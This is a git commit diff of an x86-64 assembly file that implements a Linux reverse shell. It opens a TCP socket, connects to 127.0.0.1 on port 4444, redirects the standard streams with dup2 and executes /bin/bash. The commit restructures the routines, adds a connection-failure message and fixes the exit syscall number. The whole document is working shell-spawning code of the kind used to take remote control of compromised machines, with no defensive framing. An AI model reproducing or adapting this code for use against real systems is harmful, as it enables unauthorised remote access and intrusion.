3639bf97b86d97833a3a0e617f39f3c6966facc0
Ramdhan <ramdhan@localhost.localdomain>
2021-02-18 09:20:27 +0700

    ri

--- include/re.asm
+++ include/re.asm
@@ -2,27 +2,22 @@ section .bss
     input resb 256
 
 section .rodata
-
     path_name db '/bin/bash', 0; terminate string
+    msg_failed db 'Connection refused', 10
+    len equ $
 
-    struc socket_struct; define structure
+    struc socket_; define structure
         sin_family: resw 1
         sin_port: resw 1
         sin_addr: resd 1
     endstruc
 
-    socket_istruct:
-    istruc socket_struct
+    socket_struct:
+    istruc socket_
         at sin_family, dw 2; AF_INET
         at sin_port, dw 23569; port 4444
         at sin_addr, dd 16777343; ip adress 127.0.0.1
     iend
-
-section .text
-    global _start
-
-_start:
-    jmp _socket
 
 _socket:
     mov rax, 41; sys_socket
@@ -30,21 +25,15 @@ _socket:
     mov rsi, 1; SOCK_STREAM
     mov rdx, 6; IPPROTO_TCP
     syscall
-
-    cmp rax, 3
-    jne _exit
-    jmp _connect
+    ret
 
 _connect:
     mov rax, 42; sys_connect
     mov rdi, 3; fd
-    mov rsi, socket_istruct
+    mov rsi, socket_struct
     mov rdx, 16; len
     syscall
-    
-    cmp rax, -1
-    je _exit
-    jmp _dup_fd
+    ret
 
 _dup_fd:
     mov rax, 33; sys_dup2
@@ -65,8 +54,6 @@ _dup_fd:
     xor rdx, rdx
     syscall
     
-    jmp _shell_spawn
-
 _shell_spawn:
     mov rax, 59; sys_execve
     mov rdi, path_name; /bin/bash
@@ -74,8 +61,17 @@ _shell_spawn:
     xor rdx, rdx; const char *envp
     syscall
 
+_exit_error:
+    mov rax, 1; sys_write
+    mov rdi, 2; stderr
+    mov rsi, msg_failed; const char * buff
+    mov rdx, len-msg_failed
+    syscall
+    
+    jmp _exit
+
 _exit:
-    mov rax, 1; sys_exit
+    mov rax, 60; sys_exit
     xor rdi, rdi
     xor rsi, rsi
     xor rdx, rdx
